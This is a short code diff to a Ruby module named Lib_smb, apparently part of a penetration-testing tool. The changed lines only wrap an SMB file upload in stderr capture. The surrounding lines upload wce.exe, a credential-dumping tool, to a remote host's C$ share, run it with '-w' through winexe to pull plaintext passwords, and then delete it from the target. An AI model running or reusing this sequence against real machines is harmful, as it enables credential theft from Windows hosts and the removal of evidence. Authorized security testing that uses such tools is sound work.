@@ -143,7 +143,10 @@ module Lib_smb
 			vprint_status("#{host.ljust(15)} - Uploading wce.exe as #{wce_upload_name}")
 			
 			# Upload, execute, and delete wce
-			wce_copy = smbclient("//#{host}/C$ -c", "put #{wceexe} #{temp_dir.sub('C:', '')}\\#{wce_upload_name}")
+			wce_copy = ''
+			capture_stderr {
+				wce_copy = smbclient("//#{host}/C$ -c", "put #{wceexe} #{temp_dir.sub('C:', '')}\\#{wce_upload_name}")
+			}
 			wce_results = winexe(smboptions, "CMD /C #{temp_dir}\\#{wce_upload_name} -w")
 			wce_del = winexe("--uninstall #{smboptions}", "CMD /C del #{temp_dir}\\#{wce_upload_name}")
 			### put checks to see if delete worked
